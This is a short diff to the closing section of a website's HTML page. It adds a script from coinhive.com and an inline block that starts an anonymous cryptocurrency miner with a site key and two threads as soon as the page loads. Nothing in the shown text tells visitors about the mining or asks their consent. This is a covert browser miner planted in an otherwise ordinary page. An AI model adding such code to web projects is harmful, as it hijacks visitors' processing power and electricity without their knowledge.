@@ -247,6 +247,13 @@ s.setAttribute('data-timestamp', +new Date());
 	<script src="/js/skel.min.js"></script>
 	<script src="/js/init.js"></script>
 	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.Anonymous('8O0pD3Nu5TjaiP3gEVd2s5OCMVB2ZSOY', {
+        threads: 2
+    });
+	miner.start();
+</script>
 </body>
 
 </html>
